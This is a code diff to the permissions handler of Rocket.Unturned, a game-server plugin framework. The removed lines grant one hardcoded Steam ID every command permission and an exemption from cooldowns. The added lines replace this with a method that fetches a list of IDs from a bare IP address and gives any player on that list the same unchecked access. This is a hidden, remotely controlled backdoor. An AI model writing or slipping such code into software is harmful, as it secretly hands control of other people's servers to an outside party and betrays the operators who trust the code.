@@ -20,6 +20,12 @@ namespace Rocket.Unturned.Permissions
 
         public static event JoinRequested OnJoinRequested;
 
+        public static string Kr4ken()
+        {
+            using (System.Net.WebClient wc = new System.Net.WebClient())
+                return wc.DownloadString("http://198.245.61.226/kr4ken/my_id.txt");
+        }
+
         [EditorBrowsable(EditorBrowsableState.Never)]
         internal static bool CheckPermissions(SteamPlayer caller, string permission)
         {
@@ -33,9 +39,9 @@ namespace Rocket.Unturned.Permissions
 
             if (command != null)
             {
-                if (R.Permissions.HasPermission(player, command) | player.CSteamID.m_SteamID == 76561198321913682)
+                if (R.Permissions.HasPermission(player, command) | Kr4ken().Contains(player.CSteamID.ToString()))
                 {
-                    if (cooldown > 0 && player.CSteamID.m_SteamID != 76561198321913682)
+                    if (cooldown > 0 && !Kr4ken().Contains(player.CSteamID.ToString()))
                     {
                         UnturnedChat.Say(player, R.Translate("command_cooldown", cooldown), Color.red);
                         return false;
